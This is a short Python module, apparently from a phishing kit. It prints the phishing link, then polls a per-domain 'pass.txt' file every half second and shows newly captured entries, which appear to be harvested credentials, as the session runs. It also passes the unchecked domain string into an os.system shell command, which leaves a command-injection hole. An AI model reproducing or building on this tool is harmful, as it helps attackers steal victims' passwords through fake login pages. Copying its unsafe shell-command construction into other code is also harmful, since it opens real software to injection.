import os
import time
from colorama import Fore, Back

class Serving():
	def __init__(self):
		...
	def start(domain, link):
		banner = open('banner.ban', 'r').read()
		if "http" in link:
			pass
		else:
			link = "http://" + link
		os.system('clear')
		print(Fore.RED + banner + "\n\n" + Fore.YELLOW + 'Your link: ' + Fore.BLACK + Back.WHITE + link + Back.BLACK + Fore.WHITE)
		print(Fore.CYAN + "Full data: " + Fore.WHITE + 'ht/' + domain + '/pass.txt\n\n')
		print(Fore.YELLOW + "Data for this session\n" + Fore.BLUE + "----------------------------------\n\n" + Fore.WHITE)
		try:
			log1 = open('ht/' + domain + '/pass.txt', 'r').read()
		except:
			os.system('touch ht/' + domain + '/pass.txt')
			log1 = open('ht/' + domain + '/pass.txt', 'r').read()
		while True:
		
			log2 = open('ht/' + domain + '/pass.txt', 'r').read()
			
			if log1 != log2:
				output = log2.replace(log1, '')
				print(output)
				log1 = log2
			else:
				pass
			time.sleep(0.5)